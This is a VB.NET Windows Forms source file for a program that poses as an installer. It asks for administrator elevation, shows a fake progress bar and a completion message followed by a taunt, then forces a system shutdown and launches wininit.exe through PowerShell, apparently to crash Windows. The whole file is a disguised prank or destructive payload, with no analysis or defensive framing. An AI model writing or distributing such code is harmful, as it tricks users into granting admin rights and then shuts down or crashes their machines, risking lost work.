Imports System.Threading.Thread
Imports System.IO
Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If My.User.IsInRole(Microsoft.VisualBasic.ApplicationServices.BuiltInRole.Administrator) Then
            Timer1.Start()
        Else
            MsgBox("Veuillez exécuter le programme en tant qu'Administrateur...")
            RestartElevated()
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Button1.Enabled = False
        My.Settings.run = False
        While ProgressBar1.Value < 100
            ProgressBar1.Value += 1
            Sleep(20)
        End While
        Timer1.Stop()
        LaFin()
    End Sub
    Private Sub LaFin()
        MsgBox("Installation terminée")
        MsgBox("Ou pas :3")
        Dim shutdownCommand As String = "shutdown.exe"
        Dim arguments As String = "/s /t 30 /c ""LE WOKISME"""
        ' Start the process
        Process.Start(shutdownCommand, arguments)
        Sleep(3000)
        Dim shutdownCommand1 As String = "powershell.exe"
        Dim arguments1 As String = "wininit.exe"
        Process.Start(shutdownCommand1, arguments1)
    End Sub
    Private Sub RestartElevated()
        Dim startInfo As New ProcessStartInfo()
        startInfo.UseShellExecute = True
        startInfo.WorkingDirectory = Environment.CurrentDirectory
        startInfo.FileName = Application.ExecutablePath
        startInfo.Verb = "runas"
        Try
            Dim p As Process = Process.Start(startInfo)
        Catch ex As System.ComponentModel.Win32Exception
            Return
        End Try

        My.Settings.run = True
        Application.[Exit]()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If My.User.IsInRole(Microsoft.VisualBasic.ApplicationServices.BuiltInRole.Administrator) And My.Settings.run = True Then
            Timer1.Start()
        End If
    End Sub
End Class
